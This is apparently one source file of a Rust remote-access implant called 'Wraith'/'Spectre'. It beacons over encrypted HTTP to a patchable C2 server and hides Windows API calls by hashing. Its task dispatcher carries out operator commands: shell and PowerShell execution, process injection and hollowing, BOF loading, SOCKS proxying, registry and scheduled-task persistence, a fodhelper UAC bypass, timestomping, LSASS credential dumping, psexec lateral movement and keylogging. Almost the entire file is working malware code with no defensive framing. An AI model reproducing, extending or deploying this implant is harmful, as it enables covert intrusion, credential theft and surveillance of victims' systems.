#[cfg(not(target_os = "windows"))]
use crate::utils::syscalls::*;
use alloc::format;
use alloc::vec::Vec;
use serde::{Deserialize, Serialize};
use snow::Builder;

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::{HANDLE, PVOID};
#[cfg(target_os = "windows")]
use core::ffi::c_void;

pub mod packet;
use packet::{WraithFrame, FRAME_TYPE_DATA};

// Magic signature for config patching: "WRAITH_CONFIG_BLOCK" (19 bytes)
const CONFIG_MAGIC: [u8; 19] = *b"WRAITH_CONFIG_BLOCK";

#[repr(C)]
pub struct PatchableConfig {
    magic: [u8; 19],
    pub server_addr: [u8; 64],
    pub sleep_interval: u64,
}

// Place in .data section to be writable/patchable
#[link_section = ".data"]
pub static mut GLOBAL_CONFIG: PatchableConfig = PatchableConfig {
    magic: CONFIG_MAGIC,
    server_addr: [0u8; 64], // Zeros to be patched
    sleep_interval: 5000,
};

#[derive(Debug, Serialize, Deserialize, Clone, Copy)]
pub enum TransportType {
    Http,
    Udp,
}

pub struct C2Config {
    pub transport: TransportType,
    pub server_addr: &'static str,
    pub sleep_interval: u64,
}

impl C2Config {
    pub fn get_global() -> Self {
        unsafe {
            // Check if patched
            let addr_ptr = core::ptr::addr_of!(GLOBAL_CONFIG.server_addr);
            let addr_slice = &*addr_ptr;
            let addr_len = addr_slice.iter().position(|&c| c == 0).unwrap_or(64);
            let addr_str = if addr_len > 0 {
                core::str::from_utf8_unchecked(&addr_slice[..addr_len])
            } else {
                "127.0.0.1"
            };

            Self {
                transport: TransportType::Http,
                server_addr: addr_str,
                sleep_interval: core::ptr::addr_of!(GLOBAL_CONFIG.sleep_interval).read(),
            }
        }
    }
}

pub trait Transport {
    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()>;
}

// Linux Implementation
#[cfg(not(target_os = "windows"))]
pub struct HttpTransport {
    host: &'static str,
    port: u16,
}

#[cfg(not(target_os = "windows"))]
impl HttpTransport {
    pub fn new(host: &'static str, port: u16) -> Self {
        Self { host, port }
    }
}

#[cfg(not(target_os = "windows"))]
impl Transport for HttpTransport {
    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
        unsafe {
            let sock = sys_socket(2, 1, 0);
            if (sock as isize) < 0 {
                return Err(());
            }

            // Parse host (simplified: assume IPv4)
            // 127.0.0.1 -> 0x0100007F
            let mut ip_bytes = [0u8; 4];
            let mut parts = self.host.split('.');
            for i in 0..4 {
                ip_bytes[i] = parts.next().unwrap_or("0").parse().unwrap_or(0);
            }
            let sin_addr = u32::from_ne_bytes(ip_bytes);

            let addr = SockAddrIn {
                sin_family: 2,
                sin_port: self.port.to_be(),
                sin_addr,
                sin_zero: [0; 8],
            };

            if sys_connect(sock, &addr as *const _ as *const u8, 16) != 0 {
                sys_close(sock);
                return Err(());
            }

            let req = format!(
                "POST /api/v1/beacon HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Type: application/octet-stream\r\n\
                 Content-Length: {}\r\n\
                 Connection: close\r\n\r\n",
                self.host,
                data.len()
            );

            sys_write(sock, req.as_ptr(), req.len());
            sys_write(sock, data.as_ptr(), data.len());

            let mut buf = [0u8; 4096];
            let mut resp_vec = Vec::new();
            loop {
                let n = sys_read(sock, buf.as_mut_ptr(), 4096);
                if n == 0 || (n as isize) < 0 {
                    break;
                }
                resp_vec.extend_from_slice(&buf[..n]);
            }
            sys_close(sock);

            let mut body_start = 0;
            for i in 0..resp_vec.len().saturating_sub(3) {
                if resp_vec[i] == 13 && resp_vec[i + 1] == 10 && resp_vec[i + 2] == 13 && resp_vec[i + 3] == 10 {
                    body_start = i + 4;
                    break;
                }
            }

            if body_start > 0 {
                Ok(resp_vec[body_start..].to_vec())
            } else {
                Ok(Vec::new())
            }
        }
    }
}

// Windows Implementation
#[cfg(target_os = "windows")]
pub struct HttpTransport {
    host: &'static str,
    port: u16,
}

#[cfg(target_os = "windows")]
impl HttpTransport {
    pub fn new(host: &'static str, port: u16) -> Self {
        Self { host, port }
    }
}

#[cfg(target_os = "windows")]
impl Transport for HttpTransport {
    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
        let wininet_hash = hash_str(b"wininet.dll");
        unsafe {
            type InternetOpenA = unsafe extern "system" fn(*const u8, u32, *const u8, *const u8, u32) -> HANDLE;
            type InternetConnectA = unsafe extern "system" fn(HANDLE, *const u8, u16, *const u8, *const u8, u32, u32, u32) -> HANDLE;
            type HttpOpenRequestA = unsafe extern "system" fn(HANDLE, *const u8, *const u8, *const u8, *const u8, *const *const u8, u32, u32) -> HANDLE;
            type HttpSendRequestA = unsafe extern "system" fn(HANDLE, *const u8, u32, *const c_void, u32) -> i32;
            type InternetReadFile = unsafe extern "system" fn(HANDLE, PVOID, u32, *mut u32) -> i32;
            type InternetCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;

            let internet_open: InternetOpenA = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetOpenA")));
            let internet_connect: InternetConnectA = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetConnectA")));
            let http_open: HttpOpenRequestA = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"HttpOpenRequestA")));
            let http_send: HttpSendRequestA = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"HttpSendRequestA")));
            let internet_read: InternetReadFile = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetReadFile")));
            let internet_close: InternetCloseHandle = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetCloseHandle")));

            let h_inet = internet_open(b"Spectre\0".as_ptr(), 1, core::ptr::null(), core::ptr::null(), 0);
            if h_inet.is_null() { return Err(()); }

            let mut host_c = Vec::from(self.host.as_bytes());
            host_c.push(0);
            let h_conn = internet_connect(h_inet, host_c.as_ptr(), self.port, core::ptr::null(), core::ptr::null(), 3, 0, 0);
            if h_conn.is_null() { 
                internet_close(h_inet);
                return Err(()); 
            }

            let h_req = http_open(h_conn, b"POST\0".as_ptr(), b"/api/v1/beacon\0".as_ptr(), core::ptr::null(), core::ptr::null(), core::ptr::null(), 0, 0);
            if h_req.is_null() {
                internet_close(h_conn);
                internet_close(h_inet);
                return Err(());
            }

            if http_send(h_req, core::ptr::null(), 0, data.as_ptr() as *const c_void, data.len() as u32) == 0 {
                internet_close(h_req);
                internet_close(h_conn);
                internet_close(h_inet);
                return Err(());
            }

            let mut resp_vec = Vec::new();
            let mut buf = [0u8; 4096];
            let mut bytes_read = 0;
            loop {
                if internet_read(h_req, buf.as_mut_ptr() as PVOID, 4096, &mut bytes_read) == 0 || bytes_read == 0 {
                    break;
                }
                resp_vec.extend_from_slice(&buf[..bytes_read as usize]);
            }

            internet_close(h_req);
            internet_close(h_conn);
            internet_close(h_inet);

            Ok(resp_vec)
        }
    }
}

pub fn run_beacon_loop(_initial_config: C2Config) -> !
{
    let config = C2Config::get_global();
    let mut transport = HttpTransport::new(config.server_addr, 8080);
    let mut buf = [0u8; 8192];

    // Handshake
    let params: snow::params::NoiseParams = "Noise_XX_25519_ChaChaPoly_BLAKE2s".parse().unwrap();
    let mut noise = Builder::new(params).build_initiator().unwrap();

    let len = noise.write_message(&[], &mut buf).unwrap();
    let resp = match transport.request(&buf[..len]) {
        Ok(r) => r,
        Err(_) => unsafe { crate::utils::syscalls::sys_exit(1) },
    };

    noise.read_message(&resp, &mut []).expect("Handshake read failed");

    let len = noise.write_message(&[], &mut buf).unwrap();
    let _ = transport.request(&buf[..len]); 

    let mut session = noise.into_transport_mode().unwrap();
    let mut packet_count: u64 = 0;
    let mut last_rekey = 0; // Simplified time proxy

    loop {
        // Check if rekey is needed (1M packets or time proxy)
        // For MVP, we rekey every 100 check-ins or 1M packets
        if packet_count >= 1_000_000 || last_rekey >= 100 {
            let rekey_frame = WraithFrame::new(packet::FRAME_TYPE_REKEY, Vec::new());
            let rb = rekey_frame.serialize();
            let len = session.write_message(&rb, &mut buf).unwrap();
            let _ = transport.request(&buf[..len]);
            
            session.rekey_outgoing();
            packet_count = 0;
            last_rekey = 0;
        }

        let beacon_json = r#"{"id": "spectre", "hostname": "target", "username": "root"}"#;
        let frame = WraithFrame::new(FRAME_TYPE_DATA, beacon_json.as_bytes().to_vec());
        let frame_bytes = frame.serialize();

        let len = session.write_message(&frame_bytes, &mut buf).unwrap();
        packet_count += 1;

        if let Ok(resp) = transport.request(&buf[..len]) {
            let mut pt = [0u8; 8192];
            if let Ok(len) = session.read_message(&resp, &mut pt) {
                let tasks_json = &pt[..len];
                dispatch_tasks(tasks_json, &mut session, &mut transport);
            }
        }

        last_rekey += 1;
        crate::utils::obfuscation::sleep(config.sleep_interval);
    }
}

#[derive(Deserialize)]
struct Task {
    #[allow(dead_code)]
    id: alloc::string::String,
    #[serde(rename = "type_")]
    task_type: alloc::string::String,
    payload: alloc::string::String,
}

#[derive(Deserialize)]
struct TaskList {
    tasks: alloc::vec::Vec<Task>,
}

fn hex_decode(s: &str) -> Vec<u8> {
    let mut res = Vec::new();
    let chars: Vec<char> = s.chars().collect();
    for i in (0..s.len()).step_by(2) {
        if i + 1 < s.len() {
            let byte_str = format!("{}{}", chars[i], chars[i+1]);
            if let Ok(byte) = u8::from_str_radix(&byte_str, 16) {
                res.push(byte);
            }
        }
    }
    res
}

fn dispatch_tasks(data: &[u8], session: &mut snow::TransportState, transport: &mut HttpTransport) {
    // Check for Rekey Frame first (outer wrap)
    if let Some(frame) = WraithFrame::deserialize(data) {
        if frame.frame_type == packet::FRAME_TYPE_REKEY {
            session.rekey_incoming();
            return;
        }
    }

    let clean_data = if let Some(idx) = data.iter().position(|&x| x == 0) {
        &data[..idx]
    } else {
        data
    };

    // Global SOCKS proxy instance (Simplified for no_std context)
    static mut SOCKS_PROXY: Option<crate::modules::socks::SocksProxy> = None;

    if let Ok(response) = serde_json::from_slice::<TaskList>(clean_data) {
        for task in response.tasks {
            let mut result = Vec::new();

            match task.task_type.as_str() {
                "kill" => unsafe { crate::utils::syscalls::sys_exit(0) },
                "shell" => {
                    result = crate::modules::shell::Shell.exec(&task.payload);
                },
                "powershell" => {
                    result = crate::modules::powershell::PowerShell.exec(&task.payload);
                },
                "inject" => {
                    // Payload: "<pid> <method> <payload_hex>"
                    let parts: Vec<&str> = task.payload.splitn(3, ' ').collect();
                    if parts.len() == 3 {
                        let pid = parts[0].parse::<u32>().unwrap_or(0);
                        let method = match parts[1] {
                            "reflective" => crate::modules::injection::InjectionType::Reflective,
                            "hollowing" => crate::modules::injection::InjectionType::Hollowing,
                            "hijack" => crate::modules::injection::InjectionType::ThreadHijack,
                            _ => crate::modules::injection::InjectionType::Reflective,
                        };
                        let payload = hex_decode(parts[2]);
                        let res = crate::modules::injection::Injector.inject(pid, &payload, method);
                        result = if res.is_ok() { b"Injection successful".to_vec() } else { b"Injection failed".to_vec() };
                    }
                },
                "bof" => {
                    let bof_data = hex_decode(&task.payload);
                    #[cfg(target_os = "windows")]
                    {
                        let loader = crate::modules::bof_loader::BofLoader::new(bof_data);
                        if loader.load_and_run().is_ok() {
                            result = loader.get_output();
                        } else {
                            result = b"BOF execution failed".to_vec();
                        }
                    }
                    #[cfg(not(target_os = "windows"))]
                    {
                        let _ = bof_data;
                        result = b"BOF only supported on Windows".to_vec();
                    }
                },
                "socks" => {
                    unsafe {
                        if (*core::ptr::addr_of!(SOCKS_PROXY)).is_none() {
                            *core::ptr::addr_of_mut!(SOCKS_PROXY) = Some(crate::modules::socks::SocksProxy::new());
                        }
                        let payload = hex_decode(&task.payload);
                        result = (*core::ptr::addr_of_mut!(SOCKS_PROXY)).as_mut().unwrap().process(&payload);
                    }
                },
                "persist" => {
                    // Expect payload: "method name path"
                    let parts: Vec<&str> = task.payload.splitn(3, ' ').collect();
                    if parts.len() == 3 {
                        let method = parts[0];
                        let name = parts[1];
                        let path = parts[2];
                        let res = match method {
                            "registry" => crate::modules::persistence::Persistence.install_registry_run(name, path),
                            "task" => crate::modules::persistence::Persistence.install_scheduled_task(name, path),
                            _ => Err(()),
                        };
                        result = if res.is_ok() { b"Persistence installed".to_vec() } else { b"Persistence failed".to_vec() };
                    } else {
                        result = b"Invalid persist args".to_vec();
                    }
                },
                "uac_bypass" => {
                    let res = crate::modules::privesc::PrivEsc.fodhelper(&task.payload);
                    result = if res.is_ok() { b"Exploit triggered".to_vec() } else { b"Exploit failed".to_vec() };
                },
                "timestomp" => {
                    let parts: Vec<&str> = task.payload.splitn(2, ' ').collect();
                    if parts.len() == 2 {
                        let res = crate::modules::evasion::Evasion.timestomp(parts[0], parts[1]);
                        result = if res.is_ok() { b"Timestomped".to_vec() } else { b"Failed".to_vec() };
                    }
                },
                "sandbox_check" => {
                    let is_sandbox = crate::modules::evasion::Evasion.is_sandbox();
                    result = format!("Is Sandbox: {}", is_sandbox).into_bytes();
                },
                "dump_lsass" => {
                    let res = crate::modules::credentials::Credentials.dump_lsass(&task.payload);
                    result = if res.is_ok() { b"Dump successful".to_vec() } else { b"Dump failed".to_vec() };
                },
                "sys_info" => {
                    result = crate::modules::discovery::Discovery.sys_info().into_bytes();
                },
                "net_scan" => {
                    result = crate::modules::discovery::Discovery.net_scan(&task.payload).into_bytes();
                },
                "psexec" => {
                    let parts: Vec<&str> = task.payload.splitn(3, ' ').collect();
                    if parts.len() == 3 {
                        let res = crate::modules::lateral::Lateral.psexec(parts[0], parts[1], parts[2]);
                        result = if res.is_ok() { b"Service created".to_vec() } else { b"Failed".to_vec() };
                    }
                },
                "service_stop" => {
                    let res = crate::modules::lateral::Lateral.service_stop(&task.payload);
                    result = if res.is_ok() { b"Service stopped".to_vec() } else { b"Failed".to_vec() };
                },
                "keylogger" => {
                    result = crate::modules::collection::Collection.keylogger_poll().into_bytes();
                },
                _ => {
                    // Unknown task
                }
            }

            if !result.is_empty() {
                let frame = WraithFrame::new(FRAME_TYPE_DATA, result);
                let mut buf = [0u8; 8192];
                if let Ok(len) = session.write_message(&frame.serialize(), &mut buf) {
                    let _ = transport.request(&buf[..len]);
                }
            }
        }
    }
}